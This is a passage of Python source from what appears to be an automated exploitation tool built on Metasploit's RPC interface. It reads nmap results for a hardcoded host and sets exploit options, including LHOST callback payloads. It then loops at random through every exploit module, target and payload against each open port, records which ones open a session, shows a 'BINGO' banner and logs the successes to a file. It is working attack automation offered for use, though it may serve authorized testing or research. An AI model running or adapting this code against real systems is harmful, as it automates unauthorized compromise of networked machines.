            saved_file = os.path.join(self.data_path, 'target_info_' + rhost + '.json')
            self.util.print_message(OK, 'Loaded target tree from : {}'.format(saved_file))
            fin = codecs.open(saved_file, 'r', 'utf-8')
            target_tree = json.loads(fin.read().replace('\0', ''))
            fin.close()

        return target_tree

    # Set Metasploit options.
    def set_options(self, target_info, target, selected_payload, exploit_tree):
        options = exploit_tree[target_info['exploit']]['options']
        key_list = options.keys()
        option = {}
        if target_info['target_path'] != '':
            for key in key_list:
                if options[key]['required'] is True:
                    sub_key_list = options[key].keys()
                    if 'default' in sub_key_list:
                        # If "user_specify" is not null, set "user_specify" value to the key.
                        if options[key]['user_specify'] == '':
                            option[key] = options[key]['default']
                        else:
                            option[key] = options[key]['user_specify']
                    else:
                        option[key] = '0'

                # Set target path/uri/dir etc.
                if len([s for s in self.path_collection if s in key.lower()]) != 0:
                    option[key] = target_info['target_path']

        option['RHOST'] = self.rhost
        if self.port_div_symbol in target_info['port']:
            tmp_port = target_info['port'].split(self.port_div_symbol)
            option['RPORT'] = int(tmp_port[0])
        else:
            option['RPORT'] = int(target_info['port'])
        option['TARGET'] = int(target)
        if selected_payload != '':
            option['PAYLOAD'] = selected_payload
        option['RHOSTS'] = option['RHOST']
        #option['LPORT'] = '4444'
        option['LHOST'] = self.client.host 
        return option

    # Check status of running module.
    def check_running_module(self, job_id, uuid):
        # Waiting job to finish.
        time_count = 0
        while True:
            job_id_list = self.client.get_job_list()
            if job_id in job_id_list:
                time.sleep(1)
            else:
                return True
            if self.timeout == time_count:
                self.client.stop_job(str(job_id))
                self.util.print_message(WARNING, 'Timeout: job_id={}, uuid={}'.format(job_id, uuid))
                return False
            time_count += 1

    # Show banner of successfully exploitation.
    def show_banner_bingo(self, prod_name, exploit, payload, delay_time=2.0):
        banner = u"""
        ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
          ██████╗ ██╗███╗   ██╗ ██████╗  ██████╗ ██╗██╗██╗
          ██╔══██╗██║████╗  ██║██╔════╝ ██╔═══██╗██║██║██║
          ██████╔╝██║██╔██╗ ██║██║  ███╗██║   ██║██║██║██║
          ██╔══██╗██║██║╚██╗██║██║   ██║██║   ██║╚═╝╚═╝╚═╝
          ██████╔╝██║██║ ╚████║╚██████╔╝╚██████╔╝██╗██╗██╗
          ╚═════╝ ╚═╝╚═╝  ╚═══╝ ╚═════╝  ╚═════╝ ╚═╝╚═╝╚═╝
        ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
        """ + prod_name + ' ' + exploit + ' ' + payload + '\n'
        self.util.print_message(NONE, banner)
        time.sleep(delay_time)

    def excute_brute_force(self, port_num, service_name, selected_payload, target, exploit_tree, state):
        global step
        global bingo
        step = step + 1
        print('[{}] Excute port: {} with module: {} | payload: {}'.format(step, port_num, module_name[8:], selected_payload))
        # Set target information for display.
        target_info = {'protocol': target_tree[port_num]['protocol'],
                       'target_path': target_tree[port_num]['target_path'],
                       'prod_name': service_name, 'version': target_tree[port_num]['version'],
                       'exploit': module_name[8:], 'target': target}
        port_num1 = port_num.split(':')
        port_num2 = port_num1[0].split('_')
        target_info['port'] = str(port_num2[0])

        # Set options.
        option = self.set_options(target_info, target, selected_payload, exploit_tree)
        job_id, uuid = self.client.execute_module('exploit', target_info['exploit'], option)
        if uuid is not None:
            # Check status of running module.
            _ = self.check_running_module(job_id, uuid)
            sessions = self.client.get_session_list()
            key_list = sessions.keys()
            if len(key_list) != 0:
                # Probably successfully of exploitation (but unsettled).
                for key in key_list:
                    exploit_uuid = sessions[key][b'exploit_uuid'].decode('utf-8')
                    if uuid == exploit_uuid:
                        bingo = bingo + 1
                        session_id = int(key)
                        session_port = str(sessions[key][b'session_port'])
                        session_exploit = sessions[key][b'via_exploit'].decode('utf-8')
                        session_payload = sessions[key][b'via_payload'].decode('utf-8')
                        self.client.stop_session(session_id)
                        self.client.stop_meterpreter_session(session_id)
                        state = 1
                        # Display banner.
                        self.show_banner_bingo(target_info['prod_name'], session_exploit, session_payload)
        return state


com_port_list = []
com_exploit_list = []
step = 0
bingo = 0

if __name__ == '__main__':
    util = Utilty()
    rhost = '192.168.1.11'
    env = Metasploit(rhost)
    nmap_result = 'nmap_result_' + env.rhost + '.xml'
    nmap_command = env.nmap_command + ' ' + nmap_result + ' ' + env.rhost + '\n'
#    env.execute_nmap(env.rhost, nmap_command, env.nmap_timeout)
    com_port_list, proto_list, info_list = env.Update_get_port_list(nmap_result, env.rhost)
    com_exploit_list = env.get_exploit_list()
    
    # Create exploit tree.
    exploit_tree = env.get_exploit_tree()
    target_tree = env.get_target_info(rhost, proto_list, info_list)
    #Start Brute_force

    Br_bingo = {}
    idx_service = 0
    for port_num in com_port_list:
        #Check service
        service_name = target_tree[port_num]['prod_name']
        sum = 0
        state = 0
        execute_list = []
        target_info = {}
        module_list = target_tree[port_num]['exploit']
        sum_exploit = {}
        module_list_copy = module_list.copy()
        while len(module_list_copy) > 0:
            idx_module = random.randint(0, len(module_list_copy) - 1)
            module_name = module_list_copy[idx_module] #Name module excute service
            target_list = exploit_tree[module_name[8:]]['target_list']
            target_list_copy = target_list.copy()
            sum_payload = {
                module_name:{}
            }
            while len(target_list_copy) > 0:
                idx_target = random.randint(0, len(target_list_copy) - 1)
                target = target_list_copy[idx_target] #Target excute service
                payload_list = exploit_tree[module_name[8:]]['targets'][target]
                payload_list_copy = payload_list.copy()
                while len(payload_list_copy)!=0:
                    idx = random.randint(0, len(payload_list_copy) - 1)
                    payload = payload_list_copy[idx] #Payload excute
                    state = env.excute_brute_force(port_num, service_name, payload, target, exploit_tree, state)
                    sum += 1
                    del payload_list_copy[idx]
                    if state == 1:
                        sum_payload[module_name][payload] = sum
                        break
                del target_list_copy[idx_target]
                if state == 1:
                    break
            del module_list_copy[idx_module]
            if len(sum_payload[module_name]) != 0:
                sum_exploit.update(sum_payload)
            if state == 1:
                break
        if len(sum_exploit) != 0:
            Br_bingo[port_num] = sum_exploit
        
    f = open("Brute_force_Bingo.txt", "a")
    f.write(json.dumps(Br_bingo, indent=4))
    f.close()